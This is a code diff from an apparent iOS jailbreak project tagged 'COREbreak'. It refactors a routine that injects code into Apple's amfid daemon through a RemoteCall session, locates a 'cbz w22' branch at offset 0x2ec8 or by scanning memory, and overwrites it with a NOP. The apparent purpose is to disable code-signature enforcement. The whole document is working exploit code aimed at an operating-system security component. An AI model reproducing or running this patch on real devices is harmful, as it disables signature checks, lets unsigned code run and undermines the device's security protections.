@@ -11,7 +11,9 @@
 #import <mach-o/dyld.h>
 #import <mach-o/loader.h>
 #import <sys/sysctl.h>
+#import <sys/stat.h>
 #import <sys/wait.h>
+#import <signal.h>
 #import <spawn.h>
 #import <unistd.h>
 #import <fcntl.h>
@@ -123,106 +125,7 @@ static char *write_test_binary(void)
 // Strategy 1: amfid NOP patch via RemoteCall
 // ===========================================================================
 
-// RemoteCall block: find and NOP the cbz w22 instruction in amfid's __TEXT.
-static void amfid_nop_callback(RemoteCallSession *session)
-{
-    @autoreleasepool {
-        printf("[COREbreak] inside amfid context — patching cbz w22...\n");
-
-        uint32_t imageCount = _dyld_image_count();
-        bool patched = false;
-
-        for (uint32_t i = 0; i < imageCount; i++) {
-            const char *name = _dyld_get_image_name(i);
-            if (!name) continue;
-
-            // amfid's own Mach-O: the main executable (not a dylib)
-            if (strstr(name, "amfid") &&
-                !strstr(name, "/usr/lib/") &&
-                !strstr(name, "/System/")) {
-
-                const struct mach_header_64 *hdr = (const struct mach_header_64 *)
-                    _dyld_get_image_header(i);
-                if (!hdr) continue;
-
-                // __TEXT segment is typically loaded at the header address
-                // File offset 0x2ec8 in the Mach-O → same offset in memory
-                // if __TEXT starts at fileoff 0.
-                uint32_t *patchAddr = (uint32_t *)((uint64_t)hdr + 0x2ec8);
-                uint32_t instr = *patchAddr;
-
-                printf("[COREbreak] amfid image[%u]: %s\n", i, name);
-                printf("[COREbreak]   header at %p\n", hdr);
-                printf("[COREbreak]   instr at %p = 0x%08x\n", patchAddr, instr);
-
-                // Check if this looks like cbz w22, ...
-                // CBZ encoding: 0x34000000 | (imm19 << 5) | Rt
-                // For cbz w22: Rt = 22 = 0x16
-                // So upper byte is 0x34, low 5 bits are 0x16
-                if ((instr & 0xFF00001F) == 0x34000016) {
-                    // Write NOP
-                    *patchAddr = 0xD503201F;
-
-                    // Flush instruction cache
-                    __builtin___clear_cache((char *)patchAddr, (char *)patchAddr + 4);
-
-                    // Verify
-                    uint32_t verify = *patchAddr;
-                    if (verify == 0xD503201F) {
-                        printf("[COREbreak] ✅ cbz w22 → NOP at %p\n", patchAddr);
-                        patched = true;
-                    } else {
-                        printf("[COREbreak] ❌ verification failed: 0x%08x\n", verify);
-                    }
-                } else if ((instr & 0xFF00001F) == 0xB4000016) {
-                    // cbz x22 (64-bit variant)
-                    *patchAddr = 0xD503201F;
-                    __builtin___clear_cache((char *)patchAddr, (char *)patchAddr + 4);
-                    printf("[COREbreak] ✅ cbz x22 → NOP at %p\n", patchAddr);
-                    patched = true;
-                } else {
-                    printf("[COREbreak] unexpected instruction at offset 0x2ec8: "
-                           "0x%08x (not cbz w22/x22)\n", instr);
-                }
-                break;
-            }
-        }
-
-        if (!patched) {
-            // Fallback: scan amfid's __TEXT for cbz w22 pattern
-            printf("[COREbreak] scanning amfid __TEXT for cbz w22...\n");
-            for (uint32_t i = 0; i < imageCount; i++) {
-                const char *name = _dyld_get_image_name(i);
-                if (!name || !strstr(name, "amfid") ||
-                    strstr(name, "/usr/lib/") || strstr(name, "/System/"))
-                    continue;
-
-                const struct mach_header_64 *hdr = (const struct mach_header_64 *)
-                    _dyld_get_image_header(i);
-
-                // Assume __TEXT is up to ~1 MB
-                size_t scanSize = 0x100000;
-                uint32_t *base = (uint32_t *)hdr;
-
-                for (size_t off = 0; off < scanSize; off++) {
-                    uint32_t v = base[off];
-                    if ((v & 0xFF00001F) == 0x34000016) {
-                        // Found cbz w22 — NOP it
-                        base[off] = 0xD503201F;
-                        __builtin___clear_cache((char *)&base[off], (char *)&base[off] + 4);
-                        printf("[COREbreak] ✅ found+NOP cbz w22 at %p (offset 0x%zx)\n",
-                               &base[off], off * 4);
-                        patched = true;
-                        break;
-                    }
-                }
-                break;
-            }
-        }
-
-        [session.userInfo setValue:@(patched) forKey:@"nopPatched"];
-    }
-}
+static bool g_amfid_nop_patched = false;
 
 bool coretrust_amfid_nop_patch(void)
 {
@@ -235,7 +138,8 @@ bool coretrust_amfid_nop_patch(void)
     }
     printf("[COREbreak] amfid pid = %d\n", amfidPid);
 
-    RemoteCallSession *session = [[RemoteCallSession alloc] initWithProcess:@"amfid"];
+    RemoteCallSession *session = [[RemoteCallSession alloc]
+        initWithProcess:@"amfid" useMigFilterBypass:NO];
     if (!session) {
         RemoteCallInitFailure failure = remote_call_last_init_failure();
         printf("[COREbreak] RemoteCall init for amfid failed: %s\n",
@@ -243,19 +147,92 @@ bool coretrust_amfid_nop_patch(void)
         return false;
     }
 
-    __block bool patched = false;
+    g_amfid_nop_patched = false;
     @try {
-        session.userInfo = [NSMutableDictionary dictionary];
         remote_call_with_session(session, ^{
-            amfid_nop_callback(session);
+            @autoreleasepool {
+                printf("[COREbreak] inside amfid context patching cbz w22...\n");
+
+                uint32_t imageCount = _dyld_image_count();
+                bool patched = false;
+
+                for (uint32_t i = 0; i < imageCount; i++) {
+                    const char *name = _dyld_get_image_name(i);
+                    if (!name) continue;
+
+                    if (strstr(name, "amfid") &&
+                        !strstr(name, "/usr/lib/") &&
+                        !strstr(name, "/System/")) {
+
+                        const struct mach_header_64 *hdr = (const struct mach_header_64 *)
+                            _dyld_get_image_header(i);
+                        if (!hdr) continue;
+
+                        uint32_t *patchAddr = (uint32_t *)((uint64_t)hdr + 0x2ec8);
+                        uint32_t instr = *patchAddr;
+
+                        printf("[COREbreak] amfid image[%u]: %s\n", i, name);
+                        printf("[COREbreak] header at %p instr at %p = 0x%08x\n",
+                               hdr, patchAddr, instr);
+
+                        if ((instr & 0xFF00001F) == 0x34000016) {
+                            *patchAddr = 0xD503201F;
+                            __builtin___clear_cache((char *)patchAddr, (char *)patchAddr + 4);
+                            uint32_t verify = *patchAddr;
+                            if (verify == 0xD503201F) {
+                                printf("[COREbreak] cbz w22 NOP at %p\n", patchAddr);
+                                patched = true;
+                            } else {
+                                printf("[COREbreak] verification failed: 0x%08x\n", verify);
+                            }
+                        } else if ((instr & 0xFF00001F) == 0xB4000016) {
+                            *patchAddr = 0xD503201F;
+                            __builtin___clear_cache((char *)patchAddr, (char *)patchAddr + 4);
+                            printf("[COREbreak] cbz x22 NOP at %p\n", patchAddr);
+                            patched = true;
+                        } else {
+                            printf("[COREbreak] unexpected instr at 0x2ec8: 0x%08x\n", instr);
+                        }
+                        break;
+                    }
+                }
+
+                if (!patched) {
+                    printf("[COREbreak] scanning amfid TEXT for cbz w22...\n");
+                    for (uint32_t i = 0; i < imageCount; i++) {
+                        const char *name = _dyld_get_image_name(i);
+                        if (!name || !strstr(name, "amfid") ||
+                            strstr(name, "/usr/lib/") || strstr(name, "/System/"))
+                            continue;
+
+                        const struct mach_header_64 *hdr = (const struct mach_header_64 *)
+                            _dyld_get_image_header(i);
+
+                        uint32_t *base = (uint32_t *)hdr;
+                        for (size_t off = 0; off < 0x100000; off++) {
+                            uint32_t v = base[off];
+                            if ((v & 0xFF00001F) == 0x34000016) {
+                                base[off] = 0xD503201F;
+                                __builtin___clear_cache((char *)&base[off], (char *)&base[off] + 4);
+                                printf("[COREbreak] found+NOP cbz w22 at offset 0x%zx\n", off * 4);
+                                patched = true;
+                                break;
+                            }
+                        }
+                        break;
+                    }
+                }
+
+                g_amfid_nop_patched = patched;
+            }
         });
-        patched = [session.userInfo[@"nopPatched"] boolValue];
     } @catch (NSException *e) {
         printf("[COREbreak] RemoteCall exception: %s\n", e.reason.UTF8String);
     }
 
-    printf("[COREbreak] amfid NOP patch: %s\n", patched ? "SUCCESS" : "FAILED");
-    return patched;
+    printf("[COREbreak] amfid NOP patch: %s\n",
+           g_amfid_nop_patched ? "SUCCESS" : "FAILED");
+    return g_amfid_nop_patched;
 }
 
 // ===========================================================================
